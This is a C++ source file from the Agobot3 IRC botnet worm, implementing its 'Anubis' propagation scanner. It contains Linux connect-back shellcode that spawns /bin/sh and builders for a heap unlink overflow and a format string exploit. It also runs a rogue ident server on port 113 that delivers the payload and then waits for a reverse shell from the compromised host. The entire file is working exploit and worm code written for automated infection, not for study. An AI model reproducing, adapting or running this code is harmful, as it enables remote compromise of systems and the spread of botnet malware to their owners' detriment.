/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"
#include "utility.h"
#include "shellcode.h"

#define DUMMY			0x41414141
#define BUFSIZE			512
#define AUTH_PORT		113
#define IP_INDEX		5
#define PORT_INDEX		11

#define PREV_INUSE		0x1
#define IS_MMAP			0x2
#define NON_MAIN_ARENA	0x4
#define FMTSTR			0x1
#define DAOVERFLOW		0x2

#define JMPCODE			"\xeb\x0c"

char linux_code[] =
    "\x31\xc0\x50\x50\x68\xc0\xa8\x01\x01\x66\x68\x30\x39\xb0\x02"
    "\x66\x50\x89\xe6\x6a\x06\x6a\x01\x6a\x02\x89\xe1\x31\xdb\x43"
    "\x30\xe4\xb0\x66\xcd\x80\x89\xc5\x6a\x10\x56\x55\x89\xe1\xb3"
    "\x03\xb0\x66\xcd\x80\x89\xeb\x31\xc9\x31\xc0\xb0\x3f\xcd\x80"
    "\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x31\xd2\x52\x68\x2f"
    "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
    "\x0b\xcd\x80\x31\xc0\x40\xcd\x80";

struct target {
	char type;
	char *desc;
	char *code;
	unsigned int bufaddr;	/* static buf on line 266 in net.c, used by recv() */
	unsigned int retloc;
	unsigned int offset;
	unsigned int written;
	unsigned int pad;
};

target targets[] = {
	{	DAOVERFLOW, "Linux overflow", NULL, 0x08056520, 0x08056464, 305, 0x00, 0x00 },
	{	FMTSTR, "Linux fmt", NULL, 0x08056520, 0x080563bc, 10*4, 32, 1 },	
	{ -1, NULL, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 } };

/*
		Evil Auth Server starts here
*/

class CEvilAuthServer : public CThread {
public:
	CEvilAuthServer() { m_szType="CEvilAuthServer"; }
	virtual ~CEvilAuthServer() throw() { }
	
	void *Run();
	
	CString m_sIdent;
};

void *CEvilAuthServer::Run() {
#ifdef DBGCONSOLE
	g_cConsDbg.Log(5, "CAnubisScanner(): Evil auth server running.\n");
#endif
	CSocket sListen, sClient; char input[128]; if(!sListen.Bind(113)) return NULL;
#ifdef DBGCONSOLE
	g_cConsDbg.Log(5, "CAnubisScanner(): Evil auth server bound to port 113, waiting for connection.\n");
#endif
	if(!sListen.Accept(sClient)) { sListen.Disconnect(); return NULL; }
#ifdef DBGCONSOLE
	g_cConsDbg.Log(5, "CAnubisScanner(): Evil auth server got connection, being evil.\n");
#endif
	if(!sClient.Recv(input, sizeof(input))) { sListen.Disconnect(); sClient.Disconnect(); return NULL; }
	if(!sClient.Write(m_sIdent.CStr(), m_sIdent.GetLength())) { sListen.Disconnect(); sClient.Disconnect(); return NULL; }
	sListen.Disconnect(); sClient.Disconnect(); return NULL; }

/*
		Anubis Scanner starts here
*/

class CScannerAnubis : public CScannerBase
{
public:
	CScannerAnubis();
	virtual ~CScannerAnubis() throw() { }

	bool Exploit();
};

CScannerAnubis::CScannerAnubis() { m_szType="CScannerAnubis"; m_sScannerName.Assign("Anubis"); }

char* unlinkchunk(unsigned int ret, unsigned int retloc, size_t words) {
	int *chunk; size_t i=0; if(words<14) return NULL;
	if((chunk=(int*)calloc(words*sizeof(unsigned int)+1, 1))==NULL) return NULL;
	chunk[i++]=-4; chunk[i++]=-4; chunk[i++]=-4; chunk[i++]=ret; chunk[i++]=retloc-8;
    chunk[i++]=-4; chunk[i++]=-4; chunk[i++]=-4; chunk[i++]=ret; chunk[i++]=retloc-8;
	for(;i<words;i++) {
		if(i%2) chunk[i]=((-(i-8)*4)&~(IS_MMAP|NON_MAIN_ARENA))|PREV_INUSE;
		else chunk[i]=((-(i-3)*4)&~(IS_MMAP|NON_MAIN_ARENA))|PREV_INUSE; }
	return((char *)chunk); }

int mkfmtstr(target *tgt, unsigned int ret, char *buf, size_t buflen) {
	size_t pad, espoff, written; int tmp, wb, i;
	if(buflen<50) { return -1; } memset(buf, 'P', tgt->pad%4); buf+=tgt->pad%4; written=tgt->written;
	*(unsigned long*)buf=DUMMY; *(unsigned long*)(buf+4)=tgt->retloc; buf+=8;
	*(unsigned long*)buf=DUMMY; *(unsigned long*)(buf+4)=tgt->retloc+1; buf+=8;
	*(unsigned long*)buf=DUMMY; *(unsigned long*)(buf+4)=tgt->retloc+2; buf+=8;
	*(unsigned long*)buf=DUMMY; *(unsigned long*)(buf+4)=tgt->retloc+3; buf+=8;
	buflen-=32; written+=32; for(espoff=tgt->offset; espoff>0; espoff-=4) {
		snprintf(buf, buflen, "%%08x"); buflen-=strlen("%08x"); buf+=strlen("%08x"); written+=8; }
	for(i=0; i<4; i++) { wb=((u_char*)&ret)[i]+0x100; written%=0x100; pad=(wb-written)%0x100;
		if(pad<10) pad+=0x100; tmp=snprintf(buf, buflen, "%%%du%%n", pad); written+=pad; buflen-=tmp; buf+=tmp; }
	if(buflen>=0) return written; else return -1; }

bool CScannerAnubis::Exploit()
{	bool bRetVal=false; init_random();
	CString sHost(m_sSocket.m_szHost); unsigned short sPort=m_sSocket.m_sPort;
	int connect_target=0, start_auth=0;

	// Can't infect a host from a firewalled system, cause it needs the FTP server
	if(IsPrivate(g_pMainCtrl->m_pIRC->m_sLocalIp.CStr()) && !IsPrivate(m_sSocket.m_szHost))
		return false;

	target tTmpTarget; memcpy(&tTmpTarget, &targets[1], sizeof(target));
	target *tgt=&tTmpTarget;
	CSocket sConnectBack; unsigned short sConnectBackPort=brandom(1024, 65000);
	unsigned long lConnectBackAddr=g_pMainCtrl->m_pIRC->m_lLocalAddr;
	unsigned int ret; char fmt[260], buf[BUFSIZE+1];
	char *chunk=NULL; int i;
	
	// Fail if address or port contains 0s
	if(	!(sConnectBackPort&0xff00)||!(sConnectBackPort&0x00ff)||
		!(lConnectBackAddr&0xff000000)||!(lConnectBackAddr&0x00ff0000)||
		!(lConnectBackAddr&0x0000ff00)||!(lConnectBackAddr&0x000000ff)) {
		m_sSocket.Disconnect(); return false; }
	
	if(!sConnectBack.Bind(sConnectBackPort)) { m_sSocket.Disconnect(); return false; }

	char *pCodeCopy=(char*)malloc(strlen(linux_code)+10);
	memset(pCodeCopy, 0, strlen(linux_code)+10);
	memcpy(pCodeCopy, linux_code, strlen(linux_code));
	tgt->code=pCodeCopy;
	
	(*(unsigned short*)&tgt->code[PORT_INDEX])=sConnectBackPort;
	(*(unsigned int*)&tgt->code[IP_INDEX])=lConnectBackAddr;
	
	if(tgt->type==FMTSTR) {
		ret=tgt->bufaddr+260;
		if(mkfmtstr(tgt, ret, fmt, sizeof(fmt))<0) { m_sSocket.Disconnect(); free(pCodeCopy); return false; }
		memset(buf, 0x90, sizeof(buf)); memcpy(&buf[BUFSIZE-strlen(tgt->code)-4], tgt->code, strlen(tgt->code)+1);
		i=snprintf(buf, sizeof(buf), "a: USERID: a: %s\n", fmt); if(buf[i]=='\0') buf[i]=0x90;
	} else {
		ret=tgt->bufaddr+tgt->offset+24; memset(buf, 0x90, sizeof(buf));
		memcpy(&buf[sizeof(buf)-strlen(tgt->code)-4], tgt->code, strlen(tgt->code)+1);
		if((chunk=unlinkchunk(ret, tgt->retloc, 64/4))==NULL) { m_sSocket.Disconnect(); free(pCodeCopy); return false; }
		i=snprintf(buf, sizeof(buf), "a: USERID: a:   %s", chunk); if(buf[i]=='\0') buf[i]=0x90;
		*((unsigned int*)&buf[tgt->offset])=tgt->bufaddr+68;
		memcpy(&buf[(tgt->offset+24)], JMPCODE, sizeof(JMPCODE)-1);
		buf[tgt->offset+4]='\n'; }
	
	if(!(ret&0xff000000)||!(ret&0x00ff0000)||!(ret&0x0000ff00)||!(ret&0x000000ff)) {
		m_sSocket.Disconnect(); free(pCodeCopy); return false; }
    if(!(tgt->retloc&0xff000000)||!(tgt->retloc&0x00ff0000)||!(tgt->retloc&0x0000ff00)||!(tgt->retloc&0x000000ff)) {
		m_sSocket.Disconnect(); free(pCodeCopy); return false; }
		
#ifdef DBGCONSOLE
	g_cConsDbg.Log(5, "CAnubisScanner(): Starting evil auth server.\n");
#endif
	CEvilAuthServer evilAuth; evilAuth.m_sIdent.Assign(buf); evilAuth.Start(false);
	
	Sleep(1000);
	
	// Connect to the server
#ifdef DBGCONSOLE
	g_cConsDbg.Log(5, "CAnubisScanner(): Connecting to the server.\n");
#endif
	if(!m_sSocket.Connect(m_sSocket.m_szHost, m_sSocket.m_sPort)) {
		m_sSocket.Disconnect(); free(pCodeCopy); return false; }
	
	// Wait for connect back
	CSocket sShellSock; if(!sConnectBack.Accept(sShellSock)) {
#ifdef DBGCONSOLE
		g_cConsDbg.Log(5, "CAnubisScanner(): Failed to accept connection.\n");
#endif
		evilAuth.Kill();
	} else {
#ifdef DBGCONSOLE
		g_cConsDbg.Log(5, "CAnubisScanner(): Accepted connection, exploit worked.\n");
#endif
		// Successfully exploited
	}

	// Close the socket that was once funky fresh
	m_sSocket.Disconnect(); free(pCodeCopy); return bRetVal;
}

REGSCANNER(Anubis_24, Anubis, 24, true, true, false)
